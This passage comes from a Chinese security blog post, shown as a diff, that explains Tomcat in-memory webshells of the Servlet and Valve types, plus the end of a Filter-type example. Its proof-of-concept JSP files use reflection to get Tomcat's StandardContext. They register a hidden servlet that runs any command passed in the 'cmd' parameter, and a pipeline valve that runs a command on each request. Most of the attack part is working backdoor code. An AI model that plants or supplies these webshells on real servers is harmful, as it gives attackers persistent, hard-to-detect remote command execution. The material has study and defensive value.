+    standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">//FilterConfig</span>
+    Constructor<span class="token operator">&lt;</span>ApplicationFilterConfig<span class="token operator">></span> applicationFilterConfigConstructor <span class="token operator">=</span> ApplicationFilterConfig<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> FilterDef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    applicationFilterConfigConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ApplicationFilterConfig applicationFilterConfig <span class="token operator">=</span> applicationFilterConfigConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    Field filterConfigsField <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterConfigsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Map filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> filterConfigsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">,</span> applicationFilterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token operator">></span>
+</code></pre>
+<h2 id="Servlet型内存马"><a href="#Servlet型内存马" class="headerlink" title="Servlet型内存马"></a>Servlet型内存马</h2><p>Servlet是最晚被调用的，调用顺序为Listener-&gt;Filter-&gt;Servlet</p>
+<p>servlet分为四个阶段</p>
+<pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，初始阶段，只被调用一次，也是第一次创建Servlet时被调用
+<span class="token number">2</span><span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，服务阶段。处理客户请求，<span class="token function">doGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">doPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>等
+<span class="token number">3</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">doPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>处理阶段
+<span class="token number">4</span><span class="token punctuation">.</span><span class="token function">destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，销毁阶段
+</code></pre>
+<p>构造一个恶意类</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebServlet<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/ServletShell"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletServlet</span> <span class="token keyword">implements</span> <span class="token class-name">Servlet</span> <span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>ServletConfig config<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> ServletConfig <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span>ServletRequest req<span class="token punctuation">,</span> ServletResponse res<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        String cmd <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> String <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303164012-0xhdsy1.png" alt="image">​</p>
+<p>这次查看堆栈信息是看不到创建Servlet的过程的，只能从头开始分析了,下图参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010883443/article/details/107463782%E7%9A%84%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87">https://blog.csdn.net/u010883443/article/details/107463782的一张图片</a></p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304091722-0ui67ht.png" alt="image">​</p>
+<p>我们重点关注web.xmlwebConfig解析的下一步，xml赋值对象configureContext，定位<code>org.apache.catalina.startup</code>​的<code>ContextConfig</code>​类的<code>configureContext(WebXml webxml)</code>​方法：</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">configureContext</span><span class="token punctuation">(</span>WebXml webxml<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// As far as possible, process in alphabetical order so it is easy to</span>
+        <span class="token comment" spellcheck="true">// check everything is present</span>
+        <span class="token comment" spellcheck="true">// Some validation depends on correct public ID</span>
+        <span class="token comment" spellcheck="true">//</span>
+        <span class="token comment" spellcheck="true">/*
+        .......
+        加载xml文件
+            Wrapper wrapper = context.createWrapper();
+        */</span>
+        <span class="token comment" spellcheck="true">//</span>
+            wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">></span> params <span class="token operator">=</span> servlet<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> entry <span class="token operator">:</span> params<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                wrapper<span class="token punctuation">.</span><span class="token function">addInitParameter</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            wrapper<span class="token punctuation">.</span><span class="token function">setRunAs</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getRunAs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Set<span class="token operator">&lt;</span>SecurityRoleRef<span class="token operator">></span> roleRefs <span class="token operator">=</span> servlet<span class="token punctuation">.</span><span class="token function">getSecurityRoleRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>SecurityRoleRef roleRef <span class="token operator">:</span> roleRefs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                wrapper<span class="token punctuation">.</span><span class="token function">addSecurityReference</span><span class="token punctuation">(</span>
+                        roleRef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> roleRef<span class="token punctuation">.</span><span class="token function">getLink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">/*
+        简化代码
+        */</span>
+            context<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> entry <span class="token operator">:</span>
+                webxml<span class="token punctuation">.</span><span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        SessionConfig sessionConfig <span class="token operator">=</span> webxml<span class="token punctuation">.</span><span class="token function">getSessionConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                context<span class="token punctuation">.</span><span class="token function">setSessionTimeout</span><span class="token punctuation">(</span>
+                        sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            SessionCookieConfig scc <span class="token operator">=</span>
+                context<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSessionCookieConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            scc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            scc<span class="token punctuation">.</span><span class="token function">setDomain</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            scc<span class="token punctuation">.</span><span class="token function">setPath</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookiePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            scc<span class="token punctuation">.</span><span class="token function">setComment</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieHttpOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                scc<span class="token punctuation">.</span><span class="token function">setHttpOnly</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieHttpOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieSecure</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                scc<span class="token punctuation">.</span><span class="token function">setSecure</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieSecure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieMaxAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                scc<span class="token punctuation">.</span><span class="token function">setMaxAge</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieMaxAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTrackingModes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                context<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSessionTrackingModes</span><span class="token punctuation">(</span>
+                        sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTrackingModes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token comment" spellcheck="true">// Context doesn't use version directly</span>
+        <span class="token comment" spellcheck="true">// ....</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>这里面可以提取出几个关键代码：</p>
+<pre class=" language-java"><code class="language-java">Wrapper wrapper <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+context<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>这个就是注册Servlet的关键流程</p>
+<p>写JSP文件注册即可</p>
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><pre class=" language-jsp"><code class="language-jsp"><%@ page import="javax.servlet.annotation.WebServlet" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+
+
+<%!
+    @WebServlet(name = "ServletServlet", value = "/ServletServlet")
+    public class ServletServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+            String cmd = req.getParameter("cmd");
+            Runtime.getRuntime().exec(cmd);
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%>
+
+<%
+    Field requestField = request.getClass().getDeclaredField("request");
+    requestField.setAccessible(true);
+    Request requestImp = (Request) requestField.get(request);
+    StandardContext context = (StandardContext) requestImp.getContext();
+
+    Wrapper wrapper = context.createWrapper();
+    wrapper.setName("ServletServlet");
+    wrapper.setServletClass(ServletServlet.class.getName());
+    wrapper.setServlet(new ServletServlet());
+    context.addChild(wrapper);
+    context.addServletMappingDecoded("/ServletServlet", "ServletServlet");
+%>
+</code></pre>
+<p><strong>首先要访问这个jsp文件触发构造内存马</strong>，之后访问&#x2F;ServletServlet即可触发：</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304094737-5jsr7mg.png" alt="image">​</p>
+<p>缺点就说必须访问对应的路径，不利于隐藏</p>
+<h2 id="valve型内存马"><a href="#valve型内存马" class="headerlink" title="valve型内存马"></a>valve型内存马</h2><p>Tomcat有四大组件，分别是<code>Engine</code>​,<code>Host</code>​,<code>Context</code>​,<code>Wrapper</code>​。这四个之间的消息传递与沟通离不开<code>Valve（阀门）</code>​与<code>Pipeline（管道）</code>​</p>
+<p>Valve的接口如下：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Valve</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> Valve <span class="token function">getNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNext</span><span class="token punctuation">(</span>Valve valve<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backgroundProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span>Request request<span class="token punctuation">,</span> Response response<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>简单点理解就是在Tomcat的调用过程中肯定会调用到Valve.invoke,只要我们实现这个接口并且在Valve构造恶意代码就可以达到RCE的目的</p>
+<p>但是需要讲构造的恶意Valve实现类加入到调用链中，这就需要用到<code>Pipeline</code>​，其接口如下：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Valve</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> Valve <span class="token function">getNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNext</span><span class="token punctuation">(</span>Valve valve<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backgroundProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span>Request request<span class="token punctuation">,</span> Response response<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>使用<code>Pipeline</code>​时需要注意两个点</p>
+<pre class=" language-xml"><code class="language-xml">1.pipeline添加恶意类实现RCE
+2.调用getNext()使得整条链子不会断，否则虽然可以执行命令但系统会出错
+</code></pre>
+<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><pre class=" language-jsp"><code class="language-jsp"><%@ page import="org.apache.catalina.Valve" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.Pipeline" %>
+
+<%!
+    public class ServletValve implements Valve {
+        private Valve next;
+        @Override
+        public Valve getNext() {
+            return next;
+        }
+        @Override
+        public void setNext(Valve valve) {
+            this.next = valve;
+        }
+        @Override
+        public void backgroundProcess() {
+        }
+        @Override
+        public void invoke(Request request, Response response) throws IOException, ServletException {
+            try {
+                Runtime.getRuntime().exec("calc");
+                this.getNext().invoke(request, response);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        @Override
+        public boolean isAsyncSupported() {
+            return false;
+        }
+    }
+%>
+
+<%
+    Field requestField = request.getClass().getDeclaredField("request");
+    requestField.setAccessible(true);
+    Request requestImp = (Request)requestField.get(request);
+    StandardContext standardContext = (StandardContext)requestImp.getContext();
+
+    Pipeline pipeline = standardContext.getPipeline();
+    pipeline.addValve(new ServletValve());
+%>
+</code></pre>
+<p>访问一次后构造内存马，第二次生效</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304105955-z9h86s9.png" alt="image">​</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11988">https://xz.aliyun.com/t/11988</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010883443/article/details/107463782">https://blog.csdn.net/u010883443/article/details/107463782</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Tomcat内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">Listener型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E6%B7%BB%E5%8A%A0%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">第一步 添加监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E8%8E%B7%E5%8F%96ServletContext"><span class="toc-number">1.2.2.</span> <span class="toc-text">第二步 获取ServletContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Filter型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E8%8E%B7%E5%8F%96ServletContext"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步 获取ServletContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E8%AE%BE%E7%BD%AEFilterDef"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步 设置FilterDef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5-%E8%AE%BE%E7%BD%AEFilterMap"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步 设置FilterMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5-%E5%8C%85%E8%A3%85FilterDef%E5%92%8CFilterConfig"><span class="toc-number">1.3.4.</span> <span class="toc-text">第四步 包装FilterDef和FilterConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.3.5.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">Servlet型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#valve%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.5.</span> <span class="toc-text">valve型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.6.</span> <span 